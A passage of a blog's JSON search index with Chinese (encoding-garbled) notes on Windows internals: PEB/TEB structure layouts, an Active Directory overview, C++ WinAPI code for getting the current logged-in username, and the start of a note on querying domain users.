ImageSubsystem : Uint4B +0x12c ImageSubsystemMajorVersion : Uint4B +0x130 ImageSubsystemMinorVersion : Uint4B +0x134 Padding4 : [4] UChar +0x138 ActiveProcessAffinityMask : Uint8B +0x140 GdiHandleBuffer : [60] Uint4B +0x230 PostProcessInitRoutine : Ptr64 void +0x238 TlsExpansionBitmap : Ptr64 Void +0x240 TlsExpansionBitmapBits : [32] Uint4B +0x2c0 SessionId : Uint4B +0x2c4 Padding5 : [4] UChar +0x2c8 AppCompatFlags : _ULARGE_INTEGER +0x2d0 AppCompatFlagsUser : _ULARGE_INTEGER +0x2d8 pShimData : Ptr64 Void +0x2e0 AppCompatInfo : Ptr64 Void +0x2e8 CSDVersion : _UNICODE_STRING +0x2f8 ActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA +0x300 ProcessAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP +0x308 SystemDefaultActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA +0x310 SystemAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP +0x318 MinimumStackCommit : Uint8B +0x320 SparePointers : [4] Ptr64 Void +0x340 SpareUlongs : [5] Uint4B +0x358 WerRegistrationData : Ptr64 Void +0x360 WerShipAssertPtr : Ptr64 Void +0x368 pUnused : Ptr64 Void +0x370 pImageHeaderHash : Ptr64 Void +0x378 TracingFlags : Uint4B +0x378 HeapTracingEnabled : Pos 0, 1 Bit +0x378 CritSecTracingEnabled : Pos 1, 1 Bit +0x378 LibLoaderTracingEnabled : Pos 2, 1 Bit +0x378 SpareTracingBits : Pos 3, 29 Bits +0x37c Padding6 : [4] UChar +0x380 CsrServerReadOnlySharedMemoryBase : Uint8B +0x388 TppWorkerpListLock : Uint8B +0x390 TppWorkerpList : _LIST_ENTRY +0x3a0 WaitOnAddressHashTable : [128] Ptr64 Void +0x7a0 TelemetryCoverageHeader : Ptr64 Void +0x7a8 CloudFileFlags : Uint4B +0x7ac CloudFileDiagFlags : Uint4B +0x7b0 PlaceholderCompatibilityMode : Char +0x7b1 PlaceholderCompatibilityModeReserved : [7] Char +0x7b8 LeapSecondData : Ptr64 _LEAP_SECOND_DATA +0x7c0 LeapSecondFlags : Uint4B +0x7c0 SixtySecondEnabled : Pos 0, 1 Bit +0x7c0 Reserved : Pos 1, 31 Bits +0x7c4 NtGlobalFlag2 : Uint4B","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"PEB","slug":"PEB","permalink":"https://hodlyounger.github.io/tags/PEB/"},{"name":"process","slug":"process","permalink":"https://hodlyounger.github.io/tags/process/"},{"name":"thread","slug":"thread","permalink":"https://hodlyounger.github.io/tags/thread/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"è¿›ç¨‹çº¿ç¨‹","slug":"A-OS/Windows/è¿›ç¨‹çº¿ç¨‹","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/"}]},{"title":"ã€windowsã€‘TEB (çº¿ç¨‹ç¯å¢ƒå—)","date":"2024-01-23T06:08:14.123Z","path":"A_OS/Windows/æ–‡ä»¶ä¸ç»“æ„ä½“/ã€WINã€‘TEB(çº¿ç¨‹ç¯å¢ƒå—)/","text":"æ¦‚è¿°ï¼šTEBï¼ˆThread Environment Blockï¼Œçº¿ç¨‹ç¯å¢ƒå—ï¼‰æŒ‡çº¿ç¨‹ç¯å¢ƒå—ï¼Œè¯¥ç»“æ„ä½“åŒ…å«è¿›ç¨‹ä¸­è¿è¡Œçº¿ç¨‹çš„å„ç§ä¿¡æ¯ï¼Œè¿›ç¨‹ä¸­çš„æ¯ä¸ªçº¿ç¨‹éƒ½å¯¹åº”ç€ä¸€ä¸ªTEBç»“æ„ä½“ã€‚ä¸åŒOSä¸­TEBç»“æ„ä½“çš„å½¢æ€ç•¥å¾®æœ‰ç‚¹ä¸åŒ å¾®è½¯å®˜æ–¹æ–‡æ¡£ï¼š 'çº¿ç¨‹ç¯å¢ƒå— (è°ƒè¯•è¯´æ˜) - Win32 apps | Microsoft Learn 'TEB (winternl.h) - Win32 apps | Microsoft Learn [toc] TEB ç»“æ„ä½“å®šä¹‰ MSDN 123456789101112typedef struct _TEB &#123; PVOID Reserved1[12]; PPEB ProcessEnvironmentBlock; PVOID Reserved2[399]; BYTE Reserved3[1952]; PVOID TlsSlots[64]; BYTE Reserved4[8]; PVOID Reserved5[26]; PVOID ReservedForOle; PVOID Reserved6[4]; PVOID TlsExpansionSlots;&#125; TEB, *PTEB; Windows XP SP3 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667nt!_TEB +0x000 NtTib : _NT_TIB +0x01c EnvironmentPointer : Ptr32 Void +0x020 ClientId : _CLIENT_ID +0x028 ActiveRpcHandle : Ptr32 Void +0x02c ThreadLocalStoragePointer : Ptr32 Void +0x030 ProcessEnvironmentBlock : Ptr32 _PEB +0x034 LastErrorValue : Uint4B +0x038 CountOfOwnedCriticalSections : Uint4B +0x03c CsrClientThread : Ptr32 Void +0x040 Win32ThreadInfo : Ptr32 Void +0x044 User32Reserved : [26] Uint4B +0x0ac UserReserved : [5] Uint4B +0x0c0 WOW32Reserved : Ptr32 Void +0x0c4 CurrentLocale : Uint4B +0x0c8 FpSoftwareStatusRegister : Uint4B +0x0cc SystemReserved1 : [54] Ptr32 Void +0x1a4 ExceptionCode : Int4B +0x1a8 ActivationContextStack : _ACTIVATION_CONTEXT_STACK +0x1bc SpareBytes1 : [24] UChar +0x1d4 GdiTebBatch : _GDI_TEB_BATCH +0x6b4 RealClientId : _CLIENT_ID +0x6bc GdiCachedProcessHandle : Ptr32 Void +0x6c0 GdiClientPID : Uint4B +0x6c4 GdiClientTID : Uint4B +0x6c8 GdiThreadLocalInfo : Ptr32 Void +0x6cc Win32ClientInfo : [62] Uint4B +0x7c4 glDispatchTable : [233] Ptr32 Void +0xb68 glReserved1 : [29] Uint4B +0xbdc glReserved2 : Ptr32 Void +0xbe0 glSectionInfo : Ptr32 Void +0xbe4 glSection : Ptr32 Void +0xbe8 glTable : Ptr32 Void +0xbec glCurrentRC : Ptr32 Void +0xbf0 glContext : Ptr32 Void +0xbf4 LastStatusValue : Uint4B +0xbf8 StaticUnicodeString : _UNICODE_STRING +0xc00 StaticUnicodeBuffer : [261] Uint2B +0xe0c DeallocationStack : Ptr32 Void +0xe10 TlsSlots : [64] Ptr32 Void +0xf10 TlsLinks : _LIST_ENTRY +0xf18 Vdm : Ptr32 Void +0xf1c ReservedForNtRpc : Ptr32 Void +0xf20 DbgSsReserved : [2] Ptr32 Void +0xf28 HardErrorsAreDisabled : Uint4B +0xf2c Instrumentation : [16] Ptr32 Void +0xf6c WinSockData : Ptr32 Void +0xf70 GdiBatchCount : Uint4B +0xf74 InDbgPrint : UChar +0xf75 FreeStackOnTermination : UChar +0xf76 HasFiberData : UChar +0xf77 IdealProcessor : UChar +0xf78 Spare3 : Uint4B +0xf7c ReservedForPerf : Ptr32 Void +0xf80 ReservedForOle : Ptr32 Void +0xf84 WaitingOnLoaderLock : Uint4B +0xf88 Wx86Thread : _Wx86ThreadState +0xf94 TlsExpansionSlots : Ptr32 Ptr32 Void +0xf98 ImpersonationLocale : Uint4B +0xf9c IsImpersonating : Uint4B +0xfa0 NlsCache : Ptr32 Void +0xfa4 pShimData : Ptr32 Void +0xfa8 HeapVirtualAffinity : Uint4B +0xfac CurrentTransactionHandle : Ptr32 Void +0xfb0 ActiveFrame : Ptr32 _TEB_ACTIVE_FRAME +0xfb4 SafeThunkCall : UChar +0xfb5 BooleanSpare : [3] UChar å„å˜é‡è¯´æ˜ â€œ_TEBâ€ æ˜¯ä¸€ä¸ªWindowså†…æ ¸å¯¹è±¡çš„ç»“æ„ä½“ï¼Œç”¨äºæè¿°ä¸€ä¸ªçº¿ç¨‹çš„çŠ¶æ€å’Œä¿¡æ¯ã€‚å®ƒåŒ…å«äº†çº¿ç¨‹çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œä¾‹å¦‚çº¿ç¨‹çš„å †æ ˆæŒ‡é’ˆã€ç¯å¢ƒå˜é‡ã€å †æ ˆå¤§å°ç­‰ã€‚ ä»¥ä¸‹æ˜¯ â€œ_TEBâ€ ç»“æ„ä½“ä¸­çš„ä¸€äº›å¸¸ç”¨å˜é‡åŠå…¶è¯´æ˜ï¼š *NtTeb: æŒ‡å‘å½“å‰çº¿ç¨‹çš„ â€œ_TEBâ€ ç»“æ„ä½“çš„æŒ‡é’ˆã€‚ StackBase: æŒ‡å‘çº¿ç¨‹çš„å †æ ˆèµ·å§‹åœ°å€ã€‚ StackLimit: æŒ‡å‘çº¿ç¨‹çš„å †æ ˆç»“æŸåœ°å€ã€‚ StackReserveSize: æŒ‡å®šçº¿ç¨‹çš„å †æ ˆå¤§å°ã€‚ EnvironmentPointer: æŒ‡å‘çº¿ç¨‹çš„ç¯å¢ƒå˜é‡çš„æŒ‡é’ˆã€‚ ThreadLocalStoragePointer: æŒ‡å‘çº¿ç¨‹çš„çº¿ç¨‹å±€éƒ¨å­˜å‚¨ç©ºé—´çš„æŒ‡é’ˆã€‚ *ProcessEnvironmentBlock: æŒ‡å‘è¿›ç¨‹çš„ç¯å¢ƒå˜é‡çš„æŒ‡é’ˆã€‚ BasePriority: æŒ‡å®šçº¿ç¨‹çš„ä¼˜å…ˆçº§ã€‚ UniqueThreadID: æŒ‡å®šçº¿ç¨‹çš„å”¯ä¸€IDã€‚ IdealProcessor: æŒ‡å®šçº¿ç¨‹çš„ç†æƒ³å¤„ç†å™¨ã€‚ IdealProcessorGroup: æŒ‡å®šçº¿ç¨‹çš„ç†æƒ³å¤„ç†å™¨ç»„ã€‚ ThreadLocale: æŒ‡å®šçº¿ç¨‹çš„æœ¬åœ°åŒ–ä¿¡æ¯ã€‚ ActiveStackAddress: æŒ‡å‘çº¿ç¨‹å½“å‰æ´»è·ƒçš„å †æ ˆåœ°å€ã€‚ TlsSlots: æŒ‡å‘çº¿ç¨‹çš„çº¿ç¨‹å±€éƒ¨å­˜å‚¨ç©ºé—´çš„æŒ‡é’ˆæ•°ç»„ã€‚ TlsExpansionSlots: æŒ‡å®šçº¿ç¨‹çš„çº¿ç¨‹å±€éƒ¨å­˜å‚¨ç©ºé—´çš„æ‰©å±•æ§½æ•°é‡ã€‚ Reserved: ä¿ç•™å­—æ®µã€‚ Reserved2: ä¿ç•™å­—æ®µã€‚ è¿™äº›å˜é‡å¯ä»¥ç”¨äºæŸ¥çœ‹å’Œåˆ†æçº¿ç¨‹çš„çŠ¶æ€å’Œä¿¡æ¯ã€‚æ‚¨å¯ä»¥ä½¿ç”¨Windowsè°ƒè¯•å·¥å…·ä¸­çš„ â€œdtâ€ å‘½ä»¤æŸ¥çœ‹è¿™äº›å˜é‡çš„å€¼å’Œç›¸å…³ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š 1dt nt!_TEB &lt;teb_object&gt; å…¶ä¸­ â€œ&lt;teb_object&gt;â€ æ˜¯çº¿ç¨‹çš„ â€œ_TEBâ€ ç»“æ„ä½“çš„å®ä¾‹ï¼Œä¾‹å¦‚ â€œfffffa800cd85b00â€ã€‚è¿™å°†æ˜¾ç¤ºçº¿ç¨‹çš„åç§°ã€å¤§å°ã€å½“å‰çº¿ç¨‹ç­‰ä¿¡æ¯ã€‚æ‚¨å¯ä»¥æ ¹æ®éœ€è¦è¿›ä¸€æ­¥æŸ¥çœ‹å’Œåˆ†æè¿™äº›ä¿¡æ¯ã€‚ é‡è¦æˆå‘˜ åœ¨ç”¨æˆ·æ¨¡å¼è°ƒè¯•ä¸­èµ·ç€é‡è¦ä½œç”¨çš„æˆå‘˜æœ‰2ä¸ªï¼Œå¦‚ä¸‹ï¼š 123+0x000 NtTib : _NT_TIBâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦+0x030 ProcessEnvironmentBlock : Ptr32 _PEB ProcessEnvironmentBlockæˆå‘˜ï¼š å…ˆçœ‹Offset 30å¤„çš„ProcessEnvironmentBlockæˆå‘˜ï¼Œå®ƒæ˜¯æŒ‡å‘PEBï¼ˆProcess Environment Blockï¼Œè¿›ç¨‹ç¯å¢ƒå—ï¼‰ç»“æ„ä½“æŒ‡é’ˆã€‚PEBæ˜¯è¿›ç¨‹ç¯å¢ƒå—ï¼Œæ¯ä¸ªè¿›ç¨‹å¯¹åº”1ä¸ªPEBç»“æ„ä½“ã€‚ NtTibæˆå‘˜ TEBç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªæˆå‘˜ä¸º_NT_TIBç»“æ„ä½“ï¼ˆTIBæ˜¯Thread Information Blockçš„ç®€ç§°ï¼Œæ„ä¸ºâ€œçº¿ç¨‹ä¿¡æ¯å—â€ï¼‰ï¼Œ_NT_TIBç»“æ„ä½“çš„å®šä¹‰å¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415typedef struct _NT_TIB //sizeof 1ch&#123; 00h struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; //SEHé“¾å…¥å£ 04h PVOID StackBase; //å †æ ˆåŸºå€ 08h PVOID StackLimit; //å †æ ˆå¤§å° 0ch PVOID SubSystemTib; union &#123; PVOID FiberData; 10h DWORD Version; &#125;; 14h PVOID ArbitraryUserPointer; 18h struct _NT_TIB *Self; //æœ¬NT_TIBç»“æ„è‡ªèº«çš„çº¿æ€§åœ°å€&#125;NT_TIB; typedef NT_TIB *PNT_TIB; ExceptionListæˆå‘˜æŒ‡å‘_EXCEPTION_REGISTRATION_RECORDç»“æ„ä½“ç»„æˆçš„é“¾è¡¨ï¼Œå®ƒç”¨äºWindows OSçš„SEHã€‚Selfæˆå‘˜æ˜¯_NT_TIBç»“æ„ä½“çš„è‡ªå¼•ç”¨æŒ‡é’ˆï¼Œä¹Ÿæ˜¯TEBç»“æ„ä½“çš„æŒ‡é’ˆï¼ˆå› ä¸ºTEBç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªæˆå‘˜å°±æ˜¯_NT_TIBç»“æ„ä½“ï¼‰ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹è®¿é—®åˆ°TEBç»“æ„ä½“å‘¢ï¼Ÿåªæœ‰è®¿é—®å®ƒæ‰èƒ½ä½¿ç”¨ç›¸åº”ä¿¡æ¯ã€‚","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"TEB","slug":"TEB","permalink":"https://hodlyounger.github.io/tags/TEB/"},{"name":"æ–‡ä»¶ä¸ç»“æ„ä½“","slug":"æ–‡ä»¶ä¸ç»“æ„ä½“","permalink":"https://hodlyounger.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8E%E7%BB%93%E6%9E%84%E4%BD%93/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æ–‡ä»¶ä¸ç»“æ„ä½“","slug":"A-OS/Windows/æ–‡ä»¶ä¸ç»“æ„ä½“","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%96%87%E4%BB%B6%E4%B8%8E%E7%BB%93%E6%9E%84%E4%BD%93/"}]},{"title":"ã€ADã€‘ADåŸŸ","date":"2024-01-23T06:07:44.305Z","path":"A_OS/Windows/AD/ã€ADã€‘åŸŸ/","text":"ADåŸŸå®šä¹‰åŠæè¿° ADåŸŸ ADåŸŸï¼ˆActive Directory Domainï¼‰æ˜¯ä¸€ç§Windows Serverçš„ç»„ç»‡å•å…ƒï¼Œç”¨äºç®¡ç†è®¡ç®—æœºã€ç”¨æˆ·ã€ç»„ç»‡å’Œå…¶ä»–èµ„æºã€‚å®ƒæä¾›äº†ä¸€ç§é›†ä¸­å¼çš„ç®¡ç†æ–¹å¼ï¼Œå¯ä»¥è®©ç®¡ç†å‘˜è½»æ¾åœ°ç®¡ç†ç½‘ç»œä¸­çš„èµ„æºã€‚ADåŸŸæ”¯æŒä»¥ä¸‹åŠŸèƒ½ï¼š ç”¨æˆ·å’Œè®¡ç®—æœºç®¡ç†ï¼šå¯ä»¥ä½¿ç”¨ADåŸŸæ¥ç®¡ç†ç½‘ç»œä¸­çš„ç”¨æˆ·å’Œè®¡ç®—æœºï¼ŒåŒ…æ‹¬åˆ›å»ºã€åˆ é™¤ã€ä¿®æ”¹ç”¨æˆ·å’Œè®¡ç®—æœºçš„å±æ€§ç­‰ã€‚ ç»„ç»‡ç®¡ç†ï¼šå¯ä»¥ä½¿ç”¨ADåŸŸæ¥ç®¡ç†ç½‘ç»œä¸­çš„ç»„ç»‡ï¼ŒåŒ…æ‹¬åˆ›å»ºã€åˆ é™¤ã€ä¿®æ”¹ç»„ç»‡çš„å±æ€§ç­‰ã€‚ æƒé™ç®¡ç†ï¼šå¯ä»¥ä½¿ç”¨ADåŸŸæ¥ç®¡ç†ç½‘ç»œä¸­çš„æƒé™ï¼ŒåŒ…æ‹¬æˆäºˆç”¨æˆ·è®¿é—®èµ„æºçš„æƒé™ç­‰ã€‚ ç½‘ç»œæœåŠ¡ç®¡ç†ï¼šå¯ä»¥ä½¿ç”¨ADåŸŸæ¥ç®¡ç†ç½‘ç»œä¸­çš„æœåŠ¡ï¼ŒåŒ…æ‹¬æ‰“å°æœåŠ¡ã€é‚®ä»¶æœåŠ¡ç­‰ã€‚ æ•°æ®å¤‡ä»½å’Œæ¢å¤ï¼šå¯ä»¥ä½¿ç”¨ADåŸŸæ¥å¤‡ä»½å’Œæ¢å¤ç½‘ç»œä¸­çš„æ•°æ®ï¼Œä»¥é˜²æ­¢æ•°æ®ä¸¢å¤±ã€‚","tags":[{"name":"Windows/AD","slug":"Windows-AD","permalink":"https://hodlyounger.github.io/tags/Windows-AD/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"AD","slug":"A-OS/Windows/AD","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/AD/"}]},{"title":"ã€WINAPIã€‘è·å–ç³»ç»Ÿå½“å‰ç”¨æˆ·å","date":"2024-01-22T16:00:00.000Z","path":"A_OS/Windows/API/ã€winapiã€‘è·å–ç³»ç»Ÿå½“å‰ç”¨æˆ·å/","text":"æ¦‚è¿°ï¼šwindows æ“ä½œç³»ç»Ÿè·å–ç³»ç»Ÿå½“å‰ç™»å½•çš„ç”¨æˆ· 0x01 APIæŸ¥è¯¢ç»“æœæ€»ç»“ ä»¥åŸŸåä¸ºdomainï¼Œç³»ç»Ÿå½“å‰ç™»å½•ç”¨æˆ·åä¸º test ä¸ºä¾‹ä¸¾ä¾‹è¯´æ˜ï¼Œè®¾å¤‡åä¸º WIN-FEKV0FJ89UQ API ç”¨æˆ·æ€è¿›ç¨‹ æœåŠ¡è¿›ç¨‹ GetUserName test SYSTEM GetEnvironmentVariable(è·å–ç¯å¢ƒå˜é‡ %USERNAME%) test WIN-FEKV0FJ89UQ$ WTSQuerySessionInformation(ä¸æŒ‡å®šsessionid) test æœåŠ¡è¿›ç¨‹ä¸­ä¼šè¿”å›ç©º WTSQuerySessionInformation(æŒ‡å®šsessionidä¸ºWTSGetActiveConsoleSessionId()) test test GetUserNameExA test(è¿”å›å½¢å¼ä¾æ®ä¼ å…¥çš„å‚æ•°1) domain\\WIN-FEKV0FJ89UQ æ€»ç»“ä¸‹æ¥ï¼Œå¦‚æœè¦è·å–ç³»ç»Ÿå½“å‰ç™»å½•çš„ç”¨æˆ·åï¼Œé‚£ä¹ˆä¸ç®¡æ˜¯åœ¨ç”¨æˆ·è¿›ç¨‹è¿˜æ˜¯æœåŠ¡è¿›ç¨‹ï¼Œä½¿ç”¨ WTSQuerySessionInformation æŒ‡å®š Sessionid çš„æ–¹æ³•æ¯”è¾ƒé è°±ã€‚ 0x02 è·å–ç”¨æˆ·çš„API GetUserName GetUserNameä»¥å…¶è¿è¡Œçš„exeä¸ºä¸»ï¼Œç”¨æˆ·æ€è¿›ç¨‹ä¸‹è·å–çš„ç³»ç»Ÿå½“å‰ç™»å½•çš„ç”¨æˆ·åï¼ŒæœåŠ¡è¿›ç¨‹ä¸­è·å–çš„ä¸º system ç”¨æˆ·ã€‚ 1234567std::string GetLoginUsernameByApi()&#123; char username[1024]; DWORD usernameLength = sizeof username; GetUserName(username, &amp;usernameLength); return username;&#125; é€šè¿‡ç¯å¢ƒå˜é‡è·å– %USERNAME% å’Œ GetUserName æœ¬è´¨ä¸Šä¸€è‡´ï¼Œä¸åŒçš„æ˜¯ï¼ŒæœåŠ¡è¿›ç¨‹ä¸­ï¼Œ%USERNAME% å­—æ®µä¿å­˜çš„æ˜¯ä¸»æœºå+&amp;ï¼Œåªæœ‰ç”¨æˆ·æ€è¿›ç¨‹ä¸‹æ‰æ˜¯å½“å‰ç³»ç»Ÿç™»å½•ç”¨æˆ·å 123456std::string getLoginUsernameByEnv()&#123; char username[1024]; GetEnvironmentVariable(&quot;USERNAME&quot;, username, sizeof username); return username;&#125; WTSQuerySessionInformation é€šè¿‡ä¼šè¯æŸ¥è¯¢ç”¨æˆ·å 12345678910std::string getLoginUsernameBySession()&#123; LPWSTR usernameBuffer = NULL; DWORD infoSize = 0; WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, WTS_INFO_CLASS::WTSUserName, &amp;usernameBuffer, &amp;infoSize); string username(usernameBuffer); return username;&#125; GetUserNameExA 1234567891011121314151617181920212223242526272829 BOOL GetNameEx()&#123; // è·å–å½“å‰ç™»å½•ç”¨æˆ·çš„åŸŸä¿¡æ¯ PCHAR cpuName = new CHAR[256]; PCHAR domainName = new CHAR[256]; DWORD domainNameSize = 0; ZeroMemory(domainName, 256); GetComputerObjectNameA(NameSamCompatible, NULL, &amp;domainNameSize); if (GetComputerObjectNameA(NameSamCompatible, cpuName, &amp;domainNameSize)) &#123; std::wcout &lt;&lt; &quot;å½“å‰ç™»å½•çš„åŸŸæœºå™¨: &quot; &lt;&lt; cpuName &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;æ— æ³•è·å–åŸŸä¿¡æ¯&quot; &lt;&lt; std::endl; &#125; domainNameSize = 0; GetUserNameExA(NameDisplay, NULL, &amp;domainNameSize); if (GetUserNameExA(NameDisplay, domainName, &amp;domainNameSize)) &#123; std::wcout &lt;&lt; &quot;å½“å‰ç™»å½•çš„åŸŸç”¨æˆ·: &quot; &lt;&lt; domainName &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;æ— æ³•è·å–åŸŸä¿¡æ¯&quot; &lt;&lt; std::endl; &#125;&#125; 0x03 å¦‚ä½•åœ¨æœåŠ¡è¿›ç¨‹ä¸­è·å–ç³»ç»Ÿå½“å‰ç™»å½•çš„ç”¨æˆ· è·å–å½“å‰æ§åˆ¶å°ä¼šè¯IDï¼Œç„¶åå†è°ƒç”¨ WTSQuerySessionInformationW æŸ¥è¯¢ç”¨æˆ·åã€‚ 123456789101112131415161718BOOL GetLocalCurUserName(std::wstring&amp; strUserName)&#123; BOOL bRet = FALSE; DWORD sessionId = WTSGetActiveConsoleSessionId(); LPWSTR ppBuffer[100]; DWORD bufferSize; bRet = WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, sessionId, WTSUserName, ppBuffer, &amp;bufferSize); printf(&quot; GetLocal1CurUserName --&gt; %s&quot;, *ppBuffer); if (bRet == TRUE) &#123; strUserName = *ppBuffer; WTSFreeMemory(ppBuffer); &#125; return bRet;&#125; 0x04 å…¶ä»–æ–¹å¼ ä¸Šè¿°æŒ‡å®š Sessionid çš„æ–¹æ³•ä¹Ÿå¯ä»¥é€šè¿‡ ProcessIdToSessionId æ¥è·å– Sessionidã€‚æ€è·¯å°±æ˜¯è·å–è¿›ç¨‹ Explorer.exe çš„è¿›ç¨‹idï¼Œç„¶åé€šè¿‡ PID è·å– Sessionidï¼Œæœ€åé€šè¿‡ WTSQuerySessionInformationW è·å–åˆ°å¯¹åº”çš„ç”¨æˆ·åã€‚ 12345678910111213141516171819202122232425262728293031323334DWORD GetPorceeIdByName(const std::string&amp; procName)&#123; const char* FindExe = procName.c_str(); HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (INVALID_HANDLE_VALUE == hSnapshot) &#123; return NULL; &#125; PROCESSENTRY32 pe = &#123; sizeof(pe) &#125;; for (BOOL ret = Process32First(hSnapshot, &amp;pe); ret; ret = Process32Next(hSnapshot, &amp;pe)) &#123; if (strcmp(pe.szExeFile, FindExe) == 0) &#123; CloseHandle(hSnapshot); return pe.th32ProcessID; &#125; //printf(&quot;%-6d %s\\n&quot;, pe.th32ProcessID, pe.szExeFile); &#125; CloseHandle(hSnapshot);&#125;bool GetUserNameByPid(DWORD pid, std::wstring&amp; username)&#123; DWORD SessionId; ProcessIdToSessionId(pid, &amp;SessionId); LPWSTR usernameBuffer = NULL; DWORD infoSize = 0; if (FALSE == WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, SessionId, WTS_INFO_CLASS::WTSUserName, &amp;usernameBuffer, &amp;infoSize)) &#123; return false; &#125; username = usernameBuffer; return true;&#125; æµ‹è¯• 123456789101112void test()&#123; DWORD dwPid; wstring wsUserName; if (dwPid = GetPorceeIdByName(&quot;explorer.exe&quot;)) &#123; if (GetUserNameByPid(dwPid, wsUserName)) &#123; std::wcout &lt;&lt; &quot;explorer.exe:&quot; &lt;&lt; wsUserName &lt;&lt; endl; &#125; &#125;&#125;","tags":[{"name":"winapi","slug":"winapi","permalink":"https://hodlyounger.github.io/tags/winapi/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€ADã€‘è·å–åŸŸç”¨æˆ·ä¿¡æ¯","date":"2024-01-20T16:00:00.000Z","path":"A_OS/Windows/AD/ã€ADã€‘è·å–åŸŸç”¨æˆ·ä¿¡æ¯/","text":"æ¦‚è¿°ï¼šwindows ç¯å¢ƒä¸‹è·å–åŸŸç”¨æˆ·ä¿¡æ¯ 0x01 å‰è¨€ è·å–åŸŸç”¨æˆ·ä¿¡æ¯é¦–å…ˆéœ€è¦ä¸€ä¸ªç™»å½•åˆ°åŸŸç¯å¢ƒä¸­çš„è´¦æˆ·ï¼Œç„¶åè°ƒç”¨ IAds å’Œ IDirectorySearch çš„ç›¸å…³æ¥å£æ‰§è¡ŒæŸ¥è¯¢å’Œæšä¸¾å³å¯ã€‚ ã€ADã€‘ç”¨æˆ·å±æ€§ ã€ADã€‘ç›¸å…³å‡½æ•°è°ƒç”¨ ã€ADã€‘RootDSE ã€ADã€‘åŸŸ å¾®è½¯ç›¸å…³æ–‡æ¡£ï¼š IADs å±æ€§æ–¹æ³• (Iads.h) - Win32 apps | Microsoft Learn IDirectorySearch (iads.h) - Win32 apps | Microsoft Learn 0x02 å‡½æ•°ä¸è°ƒç”¨è¯´æ˜ æ‰“å¼€é»˜è®¤çš„ rootDSE è·å– defaultNamingContext å­—æ®µå è°ƒç”¨ IAds çš„ Get() æ–¹æ³•è·å–åŸŸçš„ä¿¡æ¯ï¼Œå­—æ®µååŠè·å–çš„å±æ€§å‚è€ƒ RootDSE (AD æ¶æ„) - Win32 apps | Microsoft Learn å¦‚æœ defaultNamingContext è·å–æˆåŠŸï¼Œåˆ™æ‰“å¼€å¯¹åº” LDAP (ç¤ºä¾‹ï¼šLDAP://defaultNamingContext)ï¼Œå¦‚æœæ‰“å¼€æˆåŠŸï¼Œå°±è·å–åˆ°äº†ä¸€ä¸ª IDirectorySearch çš„å¯¹è±¡ è°ƒç”¨ IDirectorySearch::ExecuteSearch æ‰§è¡ŒæŸ¥è¯¢ï¼Œç„¶åéå†æŸ¥è¯¢å‡ºæ¥çš„ç»“æœå³å¯ã€‚ IDirectorySearch::ExecuteSearch è¯´æ˜ ä¼ å…¥ä¸€ä¸ª LDAP æ ¼å¼çš„æœç´¢ç­›é€‰å™¨å­—ç¬¦ä¸²ï¼Œå¹¶ä¼ å‡ºä¸€ä¸ª PADS_SEARCH_HANDLE çš„å¥æŸ„è¡¨ç¤ºæŸ¥è¯¢ç»“æœã€‚ LDAP æ ¼å¼çš„æœç´¢å­—ç¬¦ä¸²è¯´æ˜ ç±»ä¼¼äº SQL è¯­å¥ï¼Œå¯ä»¥å®šä¹‰è¦æŸ¥è¯¢çš„èŒƒå›´ã€‚ä¹¦å†™æ ¼å¼å‚è€ƒæ–‡ç« ï¼šæœç´¢ç­›é€‰å™¨è¯­æ³• - Win32 apps | Microsoft Learn 1234// ä¸€ä¸ª LDAPæœç´¢å­—ç¬¦ä¸²çš„ç¤ºä¾‹// å¦‚ä¸‹æ‰€ç¤ºè¡¨ç¤ºåªæŸ¥è¯¢åŸŸå†…å¯ç”¨çš„ç”¨æˆ·LPCWSTR lpwFormat1 = 